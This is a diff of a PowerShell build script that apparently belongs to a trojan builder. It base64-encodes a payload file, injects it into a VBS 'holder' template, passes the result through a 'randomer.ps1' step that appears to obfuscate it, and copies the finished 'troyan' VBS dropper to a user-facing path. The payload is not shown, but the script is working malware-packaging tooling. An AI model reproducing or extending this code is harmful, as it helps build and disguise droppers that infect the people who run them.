@@ -56,14 +56,13 @@ Function Check-Array {
     }
 }
 
-$body = Encode-FileToBase64 -inFile $server.troyanHolder
+$holderPs = Encode-FileToBase64 -inFile $server.holderRelease
 
 $holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")
 
 $result = $holder
-$result = $result -replace '0102', $body
+$result = $result -replace '0102', $holderPs
 
-$result | Set-Content $server.troyanVbsFile
-Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
-Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFileClean -Force
-& (Join-Path -Path $scriptDir -ChildPath "randomer.ps1") -inputFile $server.userVbsFile -outputFile $server.userVbsFile  -fileType vbs
+$result | Set-Content $server.troyanVbsDebug
+& (Join-Path -Path $scriptDir -ChildPath "randomer.ps1") -inputFile $server.troyanVbsDebug -outputFile $server.troyanVbsRelease -fileType vbs
+Copy-Item -Path $server.troyanVbsRelease -Destination $server.userTroyanVbs -Force
